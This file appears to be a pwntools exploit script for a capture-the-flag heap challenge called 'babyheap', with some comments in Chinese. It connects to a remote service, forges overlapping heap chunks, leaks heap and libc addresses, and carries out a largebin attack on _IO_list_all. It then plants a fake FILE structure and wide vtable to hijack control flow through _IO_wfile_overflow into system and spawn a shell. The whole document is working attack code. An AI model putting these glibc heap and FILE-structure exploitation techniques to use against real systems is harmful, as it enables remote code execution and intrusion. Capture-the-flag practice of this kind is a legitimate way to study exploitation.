#!/usr/bin/python3
from warnings import WarningMessage
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './babyheap'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

debug = 0
if debug:
    io = process('./babyheap')
else:
    #io = remote('172.10.0.7', 10001)
    io = remote('0.0.0.0', 10086)

elf = ELF('./babyheap')
libc = ELF('./libc.so.6')
one_gadgets = [0x54ed3, 0x11060a, 0x110612, 0x110617]

def p():
    gdb.attach(proc.pidof(io)[0])

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))

def cmd(i, prompt=b">>"):
    io.sendlineafter(prompt, i)

def add(size, name):
    cmd(b'1')
    size = int(hex(size),16)
    io.sendlineafter(b"input your name size",str(size).encode())
    io.sendafter(b"put your name", name)

def edit(idx, size, name):
    cmd(b'2')
    io.sendlineafter(b"input index",str(idx).encode())
    size = int(hex(size),16)
    io.sendlineafter(b"input your name size",str(size).encode())
    io.sendafter(b"put your name", name)

def show(idx):
    cmd(b'3')
    io.sendlineafter(b"input index",str(idx).encode())

def dele(idx):
    cmd(b'4')
    io.sendlineafter(b"input index",str(idx).encode())

io.recvuntil(b"and this line will make the game easier\n")
heap_base = int(io.recvuntil(b'\n', drop = True), 16) - 0x2a0
leak("heap_base", heap_base)
fake_fd = heap_base + 0x2c0
fake_bk = fake_fd
fake_chunk_part1 = flat( 
    {
        0:0, 8:0x881,
        0x10:fake_fd, 0x18:fake_bk,
    },filler = b'\x00'
) + b'\n' 
fake_chunk_part2 = flat( 
    {
        0:0,
        0x450:0x880, 0x458:0
    },filler = b'\x00'
) +b'\n'
add(0x428, b'\n') # p1 0
add(0x458, b'\n') # padding 1
add(0x4f8, b'\n') # 

add(0x400, b'\n') # 3 padding
edit(0, 0x428, fake_chunk_part1)
edit(1, 0x458, fake_chunk_part2)
dele(2) # overlapped
add(0x418, b'\n') # 2 = p1+0x10
# 现在 malloc 从 overlap 的 unsortedbin 分配
# 因为 unsortedbin 的地址低位是00, 所以要移到largebin
add(0x488, b'\n') # 4
add(0x418, b'\n') # 5
dele(4)

gadget  = libc.address + 0x00000000001314c8 # mov rdx, rax ; call qword ptr [rbx + 0x28]

set_flag = b'\x00' * 0x490 + b'  sh\n'
add(0x498, set_flag) # 4 , 原4 进largebin
show(1)
libc.address = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00' * 2) - 0x1ff110
leak("libc.address", libc.address)

# prepare fake _wide_vtable
# *(fake_vtable+0x68) = 指向需要调用函数的一个地址 而不是本身
addr_point_to_one_gadget = heap_base + 0x6f0
setcontext =0x4881d
fake_wide_vtable = flat(libc.symbols['system'], addr_point_to_one_gadget)
fake_wide_vtable_addr = addr_point_to_one_gadget - 0x68

fake_wide_vtable_and_wide_data = fake_wide_vtable 
fake_wide_vtable_and_wide_data += flat(
    {
        0x18-0x18: 0,
        0x20-0x18: 0x100,
        0xe0-0x18: fake_wide_vtable_addr

    },filler=b'\x00'
) +b'\n'
add(0x488, fake_wide_vtable_and_wide_data) # 6

wide_data_addr = heap_base + 0x6f0 + 0x10 - 0x18


# largebin attack
add(0x418, b'\n') # 7 p2
add(0x408, b'\n') # padding
#pause()

dele(0)
add(0x438,b'\n') # p1 into largebin


# exploiting with IO_wfile_overflow

lock = libc.address + 0x2008e0
_IO_wfile_over_flow_addr = libc.address + 0x1fd480
fake_vtable = _IO_wfile_over_flow_addr - 0x18 # fwrite call vtable+0x38

fake_io_file = flat(
    {
        0:0,
        0x28-0x10: libc.address + setcontext,
        0x88-0x10: lock,
        0xa0-0x10: wide_data_addr,
        0xc0-0x10: 1,
        0xd8-0x10: fake_vtable
    },filler=b'\x00'
)

edit(7, 0x418, bytes(fake_io_file)+b'\n')
dele(7) # p2 into unsortedbin
target_addr = libc.symbols['_IO_list_all']
payload = flat(heap_base + 0x2b0, target_addr-0x20) + b'\n'
edit(2, 0x20, payload)
add(0x438, b'\n') # p2 into largebin and attack

warning("set setcontext breakat " + hex(libc.symbols['system']))
pause()
cmd('5')

io.interactive()
